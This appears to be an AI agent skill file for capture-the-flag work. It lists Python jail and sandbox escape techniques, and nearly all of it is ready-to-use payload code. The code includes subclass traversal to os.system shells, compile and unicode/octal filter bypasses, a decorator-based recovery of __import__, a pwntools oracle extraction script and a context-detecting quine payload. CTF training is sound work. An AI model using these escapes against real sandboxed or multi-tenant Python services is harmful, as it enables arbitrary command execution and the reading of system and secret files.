---
name: misc-pyjails
description: "CTF Python jail escape techniques. Class hierarchy traversal, compile bypass, unicode bypass, decorator-based escape, walrus operator, octal escapes, oracle-based challenges, mastermind-style, restricted charset, quine+context detection, func_globals chain. Triggers: 'python jail', 'pyjail', 'python sandbox', 'python escape', 'ctf jail', 'sandbox escape python', 'python restrict', 'eval jail', 'exec bypass'."
---

# CTF: Python Jails

Escape sandboxed Python eval/exec via class hierarchy, builtins bypass, unicode, decorators, charset tricks.

---

## Phase 1: Identify Jail Type

```python
# Test what's available:
tests = {
    "arithmetic": "1+1",
    "strings": "'hello'",
    "hex_escape": "'\\x41'",
    "indexing": "'ab'[0]",
    "concat": "'a'+'b'",
    "lambda": "lambda:1",
    "lists": "[1,2]",
    "builtins": "__builtins__",
    "import": "__import__('os')",
    "class_hier": "''.__class__.__mro__",
}

# Error patterns reveal filtering:
# "name not allowed: X"  → identifier blacklist → try unicode/hex
# "unknown function: X"  → function whitelist → brute-force names
# "node not allowed: X"  → AST filtering → avoid blocked syntax
# "binop types must be int" → type restriction → use int ops
```

---

## Phase 2: Classic Escape via Class Hierarchy

```python
# Step 1: Navigate to object subclasses:
''.__class__.__mro__[1].__subclasses__()

# Step 2: Find useful class (index varies by Python version):
# Enumerate: [(i,x.__name__) for i,x in enumerate(''.__class__.__mro__[1].__subclasses__())]

# Common targets:
# catch_warnings (index ~59 Python 2, ~144 Python 3.8)
# _frozen_importlib.BuiltinImporter
# subprocess.Popen

# Step 3: Access __globals__ (Python 3):
''.__class__.__mro__[1].__subclasses__()[144].__init__.__globals__

# Via linecache → os chain:
().__class__.__base__.__subclasses__()[59].__init__.__globals__["linecache"].__dict__["os"].system("id")
```

---

## Phase 3: Compile / Eval Bypass

```python
# exec via compile:
exec(compile('__import__("os").system("sh")', '', 'exec'))

# Via eval:
eval(compile('__import__("os").system("id")', '<string>', 'exec'))

# Via code object:
exec(compile(open('/etc/passwd').read(), '', 'exec'))
```

---

## Phase 4: Unicode / Encoding Bypass

```python
# Fullwidth Unicode (looks like ASCII to humans):
ｅｖａｌ("__import__('os').system('id')")
ｉｍｐｏｒｔ ｏｓ

# Magic comment encoding:
# -*- coding: raw_unicode_escape -*-
import os

# Useful encodings: utf-7, raw_unicode_escape, rot_13

# Octal character escapes:
# \101 = A, \141 = a, \142 = b, etc.
exec('\151\155\160\157\162\164\40\157\163')  # "import os"
```

---

## Phase 5: Decorator-Based Escape (No ast.Call, No Quotes, No =)

```python
# Context: ast.Call banned, no quotes, no =, no commas
# Charset: a-z0-9()[]:._@\n
# __builtins__={}, __loader__=_frozen_importlib.BuiltinImporter

# Define functions for string key access:
def __builtins__():
    0
def __name__():
    0
def __import__():
    0

# Extract real __import__ from loader's globals via decorators:
# Decorators = assignment without = sign
@__loader__.load_module.__func__.__globals__[__builtins__.__name__].__getitem__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def __import__():
    0

# Import os:
@__import__
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def os():
    0

# Execute:
@os.system
@__builtins__.__class__.__dict__[__name__.__name__].__get__
def sh():
    0
```

---

## Phase 6: Oracle-Based Challenges

```python
from pwn import *

HOST, PORT = "target", 1337
r = remote(HOST, PORT)

def query(i, x):
    """Q(i, x): compare position i with value x."""
    r.sendline(f"Q({i},{x})".encode())
    return int(r.recvline().decode().strip())

def get_length():
    r.sendline(b"L()")
    return int(r.recvline().decode().strip())

# Binary search (O(n log 95)):
def find_char(i):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        cmp = query(i, mid)
        if cmp == 0:
            return chr(mid)
        elif cmp == -1:
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag_len = get_length()
flag = ''.join(find_char(i) for i in range(flag_len))
r.sendline(f"S({flag})".encode())
print(f"Flag: {flag}")
```

---

## Phase 7: Building Strings Without Concat

```python
# Hex escapes (avoid string concat if blocked):
"flag" → '\\x66\\x6c\\x61\\x67'

def to_hex_str(s):
    return "'" + ''.join(f'\\x{ord(c):02x}' for c in s) + "'"

# Restricted charset: generate numbers from symbols:
# (~, <<, []<[], {}<[]) only
def brainfuckize(nb):
    if nb == -2: return "~({}<[])"
    if nb == -1: return "~([]<[])"
    if nb == 0:  return "([]<[])"
    if nb == 1:  return "({}<[])"
    if nb % 2:   return f"~{brainfuckize(~nb)}"
    return f"({brainfuckize(nb//2)}<<({{}}<<[]))"  # times 2

# Then: "%c" % 65 → "A" with brainfuckized 65
```

---

## Phase 8: Repunit Decomposition (Two Char Restriction)

```python
# Challenge: only use chars '1' and '+' in expression
# eval(decode_long(eval(expr))) pattern

from Crypto.Util.number import bytes_to_long

target = bytes_to_long(b'eval(input())')

def repunit(k):
    return (10**k - 1) // 9  # 111...1 with k ones

terms = []
remaining = target
while remaining > 0:
    k = 1
    while repunit(k + 1) <= remaining:
        k += 1
    terms.append('1' * k)
    remaining -= repunit(k)

expr = '+'.join(terms)
# On second prompt (unrestricted): open('/flag.txt').read()
```

---

## Phase 9: Quine + Context Detection

```python
# Challenge: server validates quine in subprocess, then exec() it in main process
# Goal: print self (passes validation), exec payload only in server context

s = 's=%r;print(s%%s,end="");__import__("os").system("cat /flag.txt")if"subprocess"in globals()else 0'
print(s % s, end="")
__import__("os").system("cat /flag.txt") if "subprocess" in globals() else 0

# Context detection: "subprocess" in globals() = True in server, False in subprocess
```

---

## Phase 10: Multi-Stage via Class Attribute Persistence

```python
# Stage 1: Store payload in subclass attribute:
().__class__.__base__.__subclasses__()[-2].payload = "__import__('os').system('cat /flag.txt')"

# Stage 2 (next submission): Execute stored payload:
exec(().__class__.__base__.__subclasses__()[-2].payload)
```

---

## Walrus Operator + Octal Escape

```python
# Walrus assigns without banned = sign:
(letters := '\141\142\143\144\145\146')  # 'abcdef'
(f := open('/flag.txt').read())
print(f)
```

---

## Output

Save to `.omop/engagement/ctf/misc/`:
- `escape-payload.py`: working escape payload
- `oracle-flag.txt`: flag extracted via oracle

## Next Phase

→ `ctf-web-server-side` for SSTI / web injection
→ `ctf-pwn-rop` for binary exploitation
